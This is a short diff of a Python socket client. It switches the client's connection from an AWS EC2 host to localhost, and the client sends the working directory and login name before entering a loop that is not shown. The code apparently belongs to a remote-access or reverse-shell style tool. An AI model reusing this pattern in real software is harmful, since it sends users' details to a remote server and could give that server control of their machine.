@@ -42,8 +42,8 @@ def get(s, filename):
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 port = 1234
-s.connect(('ec2-54-209-25-3.compute-1.amazonaws.com',port))
-#s.connect(('127.0.0.1',port))
+#s.connect(('ec2-54-209-25-3.compute-1.amazonaws.com',port))
+s.connect(('127.0.0.1',port))
 s.send(os.getcwd().encode())
 s.send(os.getlogin().encode())
 while True:
